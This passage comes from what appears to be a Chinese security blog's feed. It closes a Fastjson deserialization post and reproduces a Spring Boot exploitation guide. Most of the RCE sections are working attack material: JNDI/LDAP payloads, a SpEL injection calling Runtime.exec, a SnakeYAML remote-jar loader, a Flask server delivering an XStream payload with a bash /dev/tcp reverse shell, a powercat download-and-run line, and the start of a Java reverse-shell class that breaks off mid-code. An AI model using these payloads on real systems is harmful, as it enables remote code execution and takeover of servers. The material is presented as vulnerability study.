class="string">"\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/badClassName\",\"autoCommit\":true&#125;&#125;"</span>;</span><br><span class="line">     Object obj = JSON.parseObject(payload);</span><br><span class="line">     System.out.println(obj);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/java/fastjson/2.jpg" alt=""></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"a"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="string">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"b"</span>:&#123;</span><br><span class="line">        <span class="string">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="string">"dataSourceName"</span>:<span class="string">"rmi://192.168.1.100:9999/TouchFile"</span>,</span><br><span class="line">        <span class="string">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="不开启autotype"><a href="#不开启autotype" class="headerlink" title="不开启autotype"></a>不开启autotype</h1><p><img src="../../images/java/fastjson/3.jpg" alt="">  </p><p>参考文章：<br><a href="https://www.kumamon.fun/fastjsonsecurity1/" target="_blank" rel="noopener">https://www.kumamon.fun/fastjsonsecurity1/</a><br><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/" target="_blank" rel="noopener">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a><br><a href="https://xz.aliyun.com/t/8979" target="_blank" rel="noopener">https://xz.aliyun.com/t/8979</a><br>Fastjson 1.2.24反序列化漏洞深度分析:<a href="http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/" target="_blank" rel="noopener">http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/</a><br>Fastjson历史漏洞研究（一）: <a href="https://www.anquanke.com/post/id/215753" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215753</a><br>FastJson历史漏洞研究（二）:<a href="https://www.anquanke.com/post/id/218268" target="_blank" rel="noopener">https://www.anquanke.com/post/id/218268</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。        &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>springboot相关漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/58fb41be.html"/>
    <id>https://blog.cfyqy.com/article/58fb41be.html</id>
    <published>2021-03-10T09:06:15.000Z</published>
    <updated>2021-03-22T03:12:18.178Z</updated>
    
    <content type="html"><![CDATA[<p>springboot相关漏洞学习 </p><p>转载<a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener">https://github.com/LandGrey/SpringBootVulExploit</a> </p><a id="more"></a><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="路由地址及接口调用详情泄漏"><a href="#路由地址及接口调用详情泄漏" class="headerlink" title="路由地址及接口调用详情泄漏"></a>路由地址及接口调用详情泄漏</h2><p>开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞</p><p>直接访问以下几个路由，验证漏洞是否存在：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api-docs</span><br><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br></pre></td></tr></table></figure><p>除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/mappings</span><br><span class="line">/actuator/mappings</span><br><span class="line">/metrics</span><br><span class="line">/actuator/metrics</span><br><span class="line">/beans</span><br><span class="line">/actuator/beans</span><br><span class="line">/configprops</span><br><span class="line">/actuator/configprops</span><br></pre></td></tr></table></figure><p>一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞；</p><p>但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。</p><h2 id="配置不当而暴露的路由"><a href="#配置不当而暴露的路由" class="headerlink" title="配置不当而暴露的路由"></a>配置不当而暴露的路由</h2><p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置<br>其中对寻找漏洞比较重要接口的有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;env、&#x2F;actuator&#x2F;env</span><br><span class="line">GET 请求 &#x2F;env 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；</span><br><span class="line">同时有一定概率可以通过 POST 请求 &#x2F;env 接口设置一些属性，触发相关 RCE 漏洞。</span><br><span class="line"></span><br><span class="line">&#x2F;jolokia</span><br><span class="line">通过 &#x2F;jolokia&#x2F;list 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；</span><br><span class="line"></span><br><span class="line">&#x2F;trace</span><br><span class="line">一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息</span><br></pre></td></tr></table></figure><h2 id="获取被星号脱敏的密码的明文"><a href="#获取被星号脱敏的密码的明文" class="headerlink" title="获取被星号脱敏的密码的明文"></a>获取被星号脱敏的密码的明文</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果  </p><p>详情可看：<a href="https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80" target="_blank" rel="noopener">https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80</a> </p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="whitelabel-error-page-SpEL-RCE"><a href="#whitelabel-error-page-SpEL-RCE" class="headerlink" title="whitelabel error page SpEL RCE"></a>whitelabel error page SpEL RCE</h2><p>SPEL详细介绍文章:<br><a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">由浅入深SpEL表达式注入漏洞</a><br><a href="https://xz.aliyun.com/t/9252" target="_blank" rel="noopener">有趣的SpEL注入</a>  </p><p>利用条件：</p><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><p>利用方法：</p><p>步骤一：找到一个正常传参处<br>比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。</p><p>步骤二：执行 SpEL 表达式<br>输入<code>/article?id=${7*7}</code> ，如果发现报错页面将<code>7*7</code>的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。    </p><p>由字符串格式转换成 0x** java 字节形式，方便执行任意代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">target = <span class="string">'open -a Calculator'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += hex(ord(x)) + <span class="string">","</span></span><br><span class="line">print(result.rstrip(<span class="string">','</span>))</span><br></pre></td></tr></table></figure><p>执行 calc 命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">0x63</span>,<span class="number">0x61</span>,<span class="number">0x6c</span>,<span class="number">0x63</span>&#125;))&#125;</span><br></pre></td></tr></table></figure><p>漏洞原理：</p><ul><li>spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中</li><li>此时 URL 中的参数值会用 parseStringValue 方法进行递归解析</li><li>其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ul><h2 id="spring-cloud-SnakeYAML-RCE"><a href="#spring-cloud-SnakeYAML-RCE" class="headerlink" title="spring cloud SnakeYAML RCE"></a>spring cloud SnakeYAML RCE</h2><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 /env 接口设置属性</li><li>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）</li><li>目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>利用方法：<br><strong>步骤一： 托管 yml 和 jar 文件</strong>  </p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http:&#x2F;&#x2F;artsploit.com&#x2F;yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 jar 的文件 yaml-payload.jar，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">yaml-payload</a></p><p><strong>步骤二： 设置 spring.cloud.bootstrap.location 属性</strong><br>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><p><strong>步骤三： 刷新配置</strong><br>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;refresh</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><p>漏洞原理：</p><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><p>漏洞分析：<br><a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/" target="_blank" rel="noopener">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a><br><a href="https://drops.blbana.cc/2020/03/24/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">Java SnakeYaml反序列化</a> </p><p>漏洞分析：<br><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p><h2 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h2><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 /env 接口设置属性</li><li>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）</li><li>目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>利用方法：<br>步骤一：架设响应恶意 XStream payload 的网站<br>使用python3环境运行下边这个脚本（flsak_eureka.py）架设恶意网站。并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2019/3/12 10:06</span></span><br><span class="line"><span class="comment"># @Author  : j1anFen</span></span><br><span class="line"><span class="comment"># @Site    :</span></span><br><span class="line"><span class="comment"># @File    : run.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1</span></span><br><span class="line"><span class="comment"># windows反弹shell</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powershell&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');&lt;/string&gt;</span></span><br><span class="line"><span class="comment"># &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', defaults=&#123;'path': ''&#125;)</span></span><br><span class="line"><span class="meta">@app.route('/&lt;path:path&gt;', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">catch_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    xml = <span class="string">"""&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;</span></span><br><span class="line"><span class="string">          &lt;is class="javax.crypto.CipherInputStream"&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class="javax.crypto.NullCipher"&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class="javax.imageio.spi.FilterIterator"&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class="java.util.Collections$EmptyIterator"/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                                &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                      &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/88.88.88.88/3333 0&gt;&amp;amp;1&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class="string"&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;"""</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">'application/xml'</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">2222</span>)</span><br></pre></td></tr></table></figure><p>步骤二：监听反弹 shell 的端口<br>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 3333</span><br></pre></td></tr></table></figure><p>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性<br>spring 1.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"eureka.client.serviceUrl.defaultZone"</span>,<span class="string">"value"</span>:<span class="string">"http://your-vps-ip/example"</span>&#125;</span><br></pre></td></tr></table></figure><p>步骤四：刷新配置<br>spring 1.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>漏洞分析：<br><a href="https://www.freebuf.com/column/234719.html" target="_blank" rel="noopener">Spring Boot Actuator从未授权访问到getshell</a></p><h2 id="jolokia-logback-JNDI-RCE"><a href="#jolokia-logback-JNDI-RCE" class="headerlink" title="jolokia logback JNDI RCE"></a>jolokia logback JNDI RCE</h2><p>利用条件：</p><ul><li>目标网站存在 /jolokia 或 /actuator/jolokia 接口</li><li>目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li></ul><p>利用方法：<br>步骤一：查看已存在的 MBeans<br>访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。  </p><p>步骤二：托管 xml 文件<br>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 xml 结尾的 example.xml 文件，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=<span class="string">"ldap://your-vps-ip:1389/JNDIObject"</span> as=<span class="string">"appName"</span> /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure><p>步骤三：准备要执行的 Java 代码<br>编写优化过后的用来反弹 shell 的 Java 示例代码  </p><p>JNDIObject.java，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  javac -source 1.5 -target 1.5 JNDIObject.java</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Build By LandGrey</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String ip = <span class="string">"your-vps-ip"</span>;</span><br><span class="line">            String port = <span class="string">"443"</span>;</span><br><span class="line">            String py_path = <span class="keyword">null</span>;</span><br><span class="line">            String[] cmd;</span><br><span class="line">            <span class="keyword">if</span> (!System.getProperty(<span class="string">"os.name"</span>).toLowerCase().contains(<span class="string">"windows"</span>)) &#123;</span><br><span class="line">                String[] py_envs = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/python"</span>, <span class="string">"/bin/python3"</span>, <span class="string">"/usr/bin/python"</span>, <span class="string">"/usr/bin/python3"</span>, <span class="string">"/usr/local/bin/python"</span>, <span class="string">"/usr/local/bin/python3"</span>&#125;;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; py_envs.length; ++i) &#123;</span><br><span class="line">                    String py = py_envs[i];</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(py)).exists()) &#123;</span><br><span class="line">                        py_path = py;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (py_path != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">"/bin/bash"</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;py_path, <span class="string">"-c"</span>, <span class="string">"import pty;pty.spawn(\"/bin/bash\")"</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           